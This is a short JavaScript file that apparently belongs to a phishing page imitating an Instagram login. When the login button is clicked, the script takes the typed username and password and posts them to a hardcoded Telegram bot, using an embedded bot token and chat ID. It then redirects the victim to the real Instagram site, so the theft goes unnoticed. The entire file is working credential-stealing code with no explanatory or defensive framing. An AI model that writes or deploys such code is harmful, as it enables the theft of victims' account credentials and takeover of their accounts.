

let inputs = document.querySelectorAll('input')
let buttonLogin = document.querySelector('.login-button')

const SendMessageFunction = () => {
   let Token = '7267130324:AAGIFkt5KQmPkUX-1Y7rkV_OeTOF9g8fFdo'
   let ChatId = '5959501546'
   let ApiUrl = `https://api.telegram.org/bot${Token}/sendMessage`;


   let data = {
    chat_id: ChatId,
    text:`username : ${inputs[0].value} \n password :  ${inputs[1].value}`
   }
   
   let options = {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
   };

   fetch(ApiUrl, options)
     .then(data => data.json())
     .then(res => {
      console.log('data ketdi', res)
      window.location.href = "https://www.instagram.com/"
     })
     .catch(error => console.error('Hatolik bor', error))

}
buttonLogin.addEventListener('click', SendMessageFunction)
